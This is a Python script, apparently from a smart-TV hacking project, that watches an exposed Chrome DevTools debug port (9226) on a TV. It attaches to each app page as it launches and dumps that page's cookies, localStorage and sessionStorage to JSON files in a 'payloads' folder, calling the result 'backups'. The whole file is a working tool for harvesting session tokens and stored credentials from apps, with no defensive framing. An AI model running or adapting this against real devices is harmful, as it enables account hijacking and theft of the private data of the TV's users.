#!/usr/bin/env python3
"""Watch CDP /json/list; when page targets appear, dump their localStorage+cookies."""
import json, time, os, glob, urllib.request, websocket
OUT = os.path.expanduser("~/alvidaa/payloads/app_backups")
os.makedirs(OUT, exist_ok=True)
def targets():
    try: return json.loads(urllib.request.urlopen("http://<TV_IP>:9226/json/list", timeout=6).read())
    except Exception: return []
def dump(t):
    tid = t["id"]
    safe = (t.get("url") or "unknown").replace("://", "_").replace("/", "_").replace("?", "_")[:80]
    out = os.path.join(OUT, safe + ".json")
    if os.path.exists(out): return  # already dumped
    try:
        ws = websocket.create_connection("ws://<TV_IP>:9226/devtools/page/" + tid, timeout=15)
        def ev(expr, i=1):
            ws.send(json.dumps({"id": i, "method": "Runtime.evaluate", "params": {"expression": expr, "returnByValue": True, "awaitPromise": True}}))
            while True:
                m = json.loads(ws.recv())
                if m.get("id") == i:
                    res = m.get("result", {})
                    if "exceptionDetails" in res: return "EXC: " + json.dumps(res["exceptionDetails"])[:200]
                    return res.get("result", {}).get("value")
        data = {
            "url": t.get("url"), "title": t.get("title"),
            "localStorage": ev("JSON.stringify(localStorage)"),
            "cookies": ev("document.cookie"),
            "sessionStorage": ev("JSON.stringify(sessionStorage)"),
            "origin": ev("location.origin"),
        }
        ws.close()
        with open(out, "w") as f: json.dump(data, f, indent=1)
        print("[BACKED UP] " + safe + " (" + str(os.path.getsize(out)) + " b)", flush=True)
    except Exception as e:
        print("[ERR] " + safe + ": " + str(e)[:100], flush=True)
seen = set()
print("[WATCH] polling 9226 for page targets — launch apps on the TV", flush=True)
while True:
    try:
        for t in targets():
            if t.get("type") == "page" and t["id"] not in seen:
                seen.add(t["id"])
                print("[TARGET] " + str(t.get("url"))[:80], flush=True)
                dump(t)
    except Exception: pass
    time.sleep(4)
